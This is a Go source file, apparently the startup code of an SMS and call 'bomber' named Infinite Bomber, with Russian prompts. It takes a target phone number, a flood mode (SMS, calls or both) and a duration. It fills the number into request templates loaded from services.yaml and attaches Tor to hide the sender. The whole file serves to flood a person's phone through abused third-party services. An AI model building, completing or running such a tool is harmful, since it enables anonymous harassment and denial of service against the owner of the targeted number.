package main

import (
	"bufio"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"

	"github.com/fatih/color"
	"gopkg.in/yaml.v2"
)

var (
	execPath string
	execDir  string
)

var testEnv = os.Getenv("INFIBOMBTEST") == "1"

var argsNotExist = len(os.Args) < 2

func init() {
	var err error
	// Использование только одного ядра процессора
	runtime.GOMAXPROCS(1)

	color.New(color.FgHiMagenta).Print("Infinite")
	print(" Bomber ")
	color.New(color.FgRed).Println(version)

	ex, err := os.Executable()
	errCheck(err)
	execPath, err = filepath.Abs(ex)
	errCheck(err)
	execDir = filepath.Dir(execPath)

	cyanPr := color.New(color.FgCyan).Print
	scanner := bufio.NewScanner(os.Stdin)

	argsLen := len(os.Args)

	have2args := argsLen >= 2

	for {
		if have2args {
			num = os.Args[1]
		} else {
			cyanPr("Пожалуйста, введите номер телефона (прим. 79112345678): ")
			scanner.Scan()
			errCheck(scanner.Err())
			num = scanner.Text()
		}

		ok := true
		for _, v := range num {
			if v < '0' || v > '9' {
				println("Номер может содержать только цифры!")
				ok = false
				break
			}
		}

		if len(num) < 10 {
			println("Номер должен содержать по карйней мере 10 цифр!")
			ok = false
		}

		if ok {
			break
		} else if !argsNotExist {
			shutdown(true)
		}
	}

	var ans string
	have3args := argsLen >= 3
	for {
		if have3args {
			ans = os.Args[2]
		} else {
			cyanPr(`Пожалуйста, введите режим флуда (1 - только SMS, 2 - только CALL, 3 - SMS и CALL): `)
			scanner.Scan()
			errCheck(scanner.Err())
			ans = scanner.Text()
		}

		if ans == "1" {
			floodMode = 1
			break
		} else if ans == "2" {
			floodMode = 2
			break
		} else if ans == "3" {
			floodMode = 3
			break
		} else if have3args {
			println("Второй параметр должен быть 1, 2, или 3!")
			shutdown(true)
		} else {
			println("Пожалуйста, введите 1, 2, или 3!")
		}
	}

	have4args := argsLen >= 4
	for {
		if have4args {
			ans = os.Args[3]
		} else {
			cyanPr(`Пожалуйста, введите режим лога (0 - выкл, 1 - только OK, 2 - только ERR, 3 - OK и ERR): `)
			scanner.Scan()
			errCheck(scanner.Err())
			ans = scanner.Text()
		}

		if ans == "0" {
			logging = 0
			okLog = func(typParam) {}
			grPrntln = nil
			errLog = func(typParam) {}
			redPrntln = nil
			break
		} else if ans == "1" {
			logging = 1
			errLog = func(typParam) {}
			redPrntln = nil
			break
		} else if ans == "2" {
			logging = 2
			okLog = func(typParam) {}
			grPrntln = nil
			break
		} else if ans == "3" {
			logging = 3
			break
		} else if have4args {
			println("Третий параметр должен быть 0, 1, 2, или 3!")
			shutdown(true)
		} else {
			println("Пожалуйста, введите 0, 1, 2, или 3!")
		}
	}

	have5args := argsLen >= 5
	for {
		if have5args {
			ans = os.Args[4]
		} else {
			cyanPr(`Пожалуйста, введите время флуда в секундах (0 - бесконечно): `)
			scanner.Scan()
			errCheck(scanner.Err())
			ans = scanner.Text()
		}

		floodTime, err = strconv.Atoi(ans)
		if err != nil || floodTime > 294967296 {
			if have5args {
				println("Четвёртый параметр должен быть не больше 294967296!")
				shutdown(true)
			} else {
				println("Этот параметр должен быть 0 или положительным целым числом меньше 294967296!")
				continue
			}
		}
		if floodTime < 0 {
			if have5args {
				println("Четвёртый параметр должен быть 0 или положительным целым числом!")
				shutdown(true)
			} else {
				println("Пожалуйста, введите положительное целое число или 0!")
				continue
			}
		}
		break
	}

	// Инициализация Сервисов
	println("Инициализация сервисов...")
	fb, err := ioutil.ReadFile(filepath.Join(execDir, "services.yaml"))
	errCheck(err)
	text := strings.NewReplacer(
		"<num>", num, // 79112345678
		"<num2>", num[1:], // 9112345678
		"<num3>", num[0:1]+" ("+num[1:4]+") "+num[4:7]+"-"+num[7:9]+"-"+num[9:], // 7 (911) 234-56-78
		"<num4>", num[0:1]+" ("+num[1:4]+") "+num[4:7]+" "+num[7:9]+" "+num[9:], // 7 (911) 234 56 78
		"<num5>", num[0:1]+" ("+num[1:4]+")"+num[4:7]+"-"+num[7:9]+"-"+num[9:], // 7 (911)234-56-78
		"<num6>", num[0:1]+" ("+num[1:4]+")"+num[4:7]+"-"+num[7:9]+"-"+num[9:], // 7(911)234 56 78
		"<num7>", num[0:1]+" "+num[1:4]+" "+num[4:7]+"-"+num[7:9]+"-"+num[9:], // 7 911 234-56-78
		"<num8>", num[0:1]+" "+num[1:4]+" "+num[4:7]+" "+num[7:9]+" "+num[9:], // 7 911 234 56 78

		"<num9>", num[0:1]+" ("+num[1:4]+")"+num[4:7]+"-"+num[7:9]+"-"+num[9:], // 7(911)234-56-78
		"<num10>", num[0:1]+" ("+num[1:4]+")"+num[4:7]+"-"+num[7:9]+"-"+num[9:], // 7(911)2345678

		"<num11>", num[0:1]+"%20("+num[1:4]+")%20"+num[4:7]+"-"+num[7:9]+"-"+num[9:], // 7%20(911)%20234-56-78
		"<num12>", num[0:1]+"%20("+num[1:4]+")%20"+num[4:7]+"%20"+num[7:9]+"%20"+num[9:], // 7%20(911)%20234%2056%2078
		"<num13>", num[0:1]+"%20("+num[1:4]+")"+num[4:7]+"-"+num[7:9]+"-"+num[9:], // 7%20(911)234-56-78
		"<num14>", num[0:1]+"%20("+num[1:4]+")"+num[4:7]+"-"+num[7:9]+"-"+num[9:], // 7(911)234%2056%2078
		"<num15>", num[0:1]+"%20"+num[1:4]+"%20"+num[4:7]+"-"+num[7:9]+"-"+num[9:], // 7%20911%20234-56-78
		"<num16>", num[0:1]+"%20"+num[1:4]+"%20"+num[4:7]+"%20"+num[7:9]+"%20"+num[9:], // 7%20911%20234%2056%2078
	).Replace(string(fb))

	if testEnv {
		println(text)
	}

	err = yaml.UnmarshalStrict([]byte(text), services)
	errCheck(err)

	// Инициализация Tor-а
	attachTor()
}
